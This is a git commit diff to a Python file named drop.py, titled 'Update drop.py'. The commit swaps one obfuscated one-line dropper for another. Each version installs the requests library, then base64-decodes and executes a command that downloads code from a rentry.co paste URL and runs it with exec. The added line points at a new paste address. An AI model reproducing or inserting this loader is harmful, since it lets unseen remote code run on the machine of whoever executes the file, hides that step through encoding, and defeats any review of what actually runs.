432207b680f34c24e8b0ae9f0b50f730748e7e54
Badsi 8===D <101473281+badsii@users.noreply.github.com>
2024-09-16 13:50:04 -0700

    Update drop.py

--- drop.py
+++ drop.py
@@ -1,1 +1,1 @@
-import os;os.system('pip install requests');import requests;import base64;exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvL2RyMHAvcmF3IikudGV4dCk=').decode())
+import os;os.system('pip install requests');import requests;import base64;exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvLzltdHBkZWR0L3JhdyIpLnRleHQp').decode())
